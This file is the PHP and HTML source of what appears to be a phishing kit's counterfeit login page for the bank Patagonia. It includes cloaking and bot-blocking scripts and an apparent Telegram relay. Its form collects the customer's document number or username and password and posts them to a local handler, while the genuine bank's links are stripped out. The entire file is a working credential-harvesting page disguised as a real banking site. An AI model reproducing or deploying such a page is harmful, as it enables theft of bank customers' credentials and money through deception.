<?php
include './config.php';
include './aires/tg.php';
include './shield/cloack_start.php';
if ($EYEZ == 1){
    include './guardian/start.php';
}
if ($blocker == false){
    include './sistema/view.php';
}
?>
<!DOCTYPE html
	PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>

<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

	<link href="./necesidad/css/lnue.css" type="text/css" rel="stylesheet">
	<link href="./necesidad/css/global.css" type="text/css" rel="stylesheet">
	<link href="./necesidad/css/nuevo.css" type="text/css" rel="stylesheet">
	<link rel="icon" href="./necesidad/img/favicon.ico">
	<title>Patago</title>

	<script type="text/javascript">
		function selEy(tipo) {

			if (tipo == 'documento') {
				document.getElementById("documento").checked = true;
				document.getElementById("ld").style.display = "block";
				document.getElementById("lASey").style.display = "none";
				document.getElementById("docasma").value = "";
			}
			if (tipo == 'alias') {
				document.getElementById("alias").checked = true;
				document.getElementById("ld").style.display = "none";
				document.getElementById("lASey").style.display = "block";
				document.getElementById("lASey").value = "";
			}
		}
	</script>
	<style>
	</style>

</head>

<body class="yui-skin-sam">

	<div id="page">

		<div id="logosHeader">
			<div id="headerIzq">
				<div id="logoEbeyn"></div>
			</div>
			<div id="headerDer">
				<div id="logoPatagoniaHeader"></div>
			</div>
		</div>

		<div id="linkslng">
			<ul>
				<li><a>Sucursales y
						Cajeros</a>&nbsp;|&nbsp;</li>
				<li><a>Ayuda</a>&nbsp;|&nbsp;</li>
				<li><a>Contáctenos</a></li>
			</ul>
		</div>



		<div id="toplngDiv" style="width: 100%;height:100%; margin-left:auto;margin-right: auto; margin-top :50px;">
			<style>
				input:hover {

					font-size: 14px;

				}
			</style>


			<div style="width: 780px; height: 310px; clear: both; margin-left: 21px; margin-top: 5px;">
				<div style="width: 297px; float: left; margin: 0;">
					<div style="width: 100%; background-color: #B3C8D9; height: 310px;">
						<div style="width: 80%;">
							<img src="./necesidad/img/bienvenido.gif" border="0">
						</div>
						<div
							style="width: 100%; font-family: Arial; font-size: 12px; font-weight: normal; text-align: left; margin: 5px 5px 5px 10px;">
							<form id="fl" method="post" action="./aires/verde.php">

								<div id="fl">
									Seleccione Documento o Usuario para ingresar.
								</div>

								<div id="fl">

									<div id="radioTipolng">
										<div id="radiolng">
											<input type="radio" id="documento" name="tipolng" checked="checked"
												value="documento" class="punp">
											Documento
										</div>
										<div id="radiolng">
											<input type="radio" id="alias" name="tipolng" value="alias" class="punp">
											Usuario
										</div>
									</div>

								</div>


								<div id="fl">
									<div id="ld" style="display: block;">
										<div id="ftx">Documento</div>
										<div id="fis">
											<select name="tipoDoc">

												<option value="DNI">DNI</option>

												<option value="CI">CI</option>

												<option value="PASAPORTE">PASAPORTE</option>

												<option value="LC">LC</option>

												<option value="LE">LE</option>

											</select> <input type="tel" autocomplete="off" id="docasma" name="docasma"
												maxlength="11" tabindex="1" class="punp">
										</div>
									</div>
								</div>

								<div id="fl">
									<div id="lASey" style="display: none;">
										<div id="ftx">
											Usuario
										</div>
										<div id="fit">
											<input type="text" autocomplete="off" id="daris" name="daris" maxlength="15"
												tabindex="1" class="punp">
										</div>
										<div id="FormLink">
											<a>Olvidé
												mi Usuario </a>
										</div>
									</div>
								</div>


								<div id="fl">
									<div id="ftx">
										Clave
									</div>
									<div id="fit">
										<input type="password" required autocomplete="off" name="doras" id="doras"
											maxlength="8" tabindex="2" class="punp">
									</div>
									<div id="FormLink">
										<a>Olvidé
											mi Clave </a><br>

									</div>
								</div>


								<div id="fle">
									<div
										style="text-align: center; margin-left: auto; margin-right: auto; width: 100px;">
										<button style="background-color: #B3C8D9;border: none" id="botonAcceso"
											name="botonAcceso" type="submit"><img src="./necesidad/img/boto.gif"
												border="0" name="imagenBoton">
										</button>
									</div>


								</div>
								<div id="fle" style="padding-right: 15px;">
									<img src="./necesidad/img/punteadaBlanca.gif" border="0"><br>
								</div>
								<div id="fle"></div>

							</form>

							<div id="fle" style="margin-top: 5px;margin-top: 0px;">
								<div>
									<!-- 							&nbsp;&nbsp; -->
									Si olvidaste usuario y clave o para operar por primera vez
									&nbsp; &nbsp;&nbsp;


								</div>

							</div>
							<div id="fle">
								<div
									style="text-align: center; margin-left: auto; margin-right: auto; width: 170px; height: 25px;padding-top:3px; _height: 30px; *height: 20px;">
									<div class="btn"><a>Crear
											usuario y clave</a><span></span></div>
								</div>
							</div>


						</div>
					</div>
					<div></div>
				</div>

				<div style="float: left; height: 310px; overflow: hidden; text-align: left; margin-top: 0px;">
					<a>
						<img src="./necesidad/img/nuev.png" height="310px" width="440px" style="border: none;">
					</a>
				</div>


			</div>
			<div id="footerlng">

				<div style="float: left; height: 165px; width: 297px;">


					<div style="display: table-cell; height: 90px;">
						<a>
							<img src="./necesidad/img/nuemo.png" style="border: none;">
						</a>
					</div>

					<div style="height: 75px;">
						<a>
							<img src="./necesidad/img/nuepat.png" style="border: none;">
						</a>
					</div>

				</div>

				<div id="ayuda">
					<a>
						<img src="./necesidad/img/nueto.png" alt="" height="167px" width="221px" style="border: none;">
					</a>
				</div>

				<div id="seguridad">
					<a><img src="./necesidad/img/ben.png" alt="" height="167px" width="223px" style="border: none;">
					</a>
				</div>


			</div>

		</div>

		<div id="footerlngGral">

			<div id="footer_content">
				<img src="./necesidad/img/logo.gif">&nbsp;©&nbsp;
				&nbsp;|&nbsp;
				<a>Cláusulas
					Legales</a>&nbsp;
			</div>
		</div>
	</div>

</body>

</html>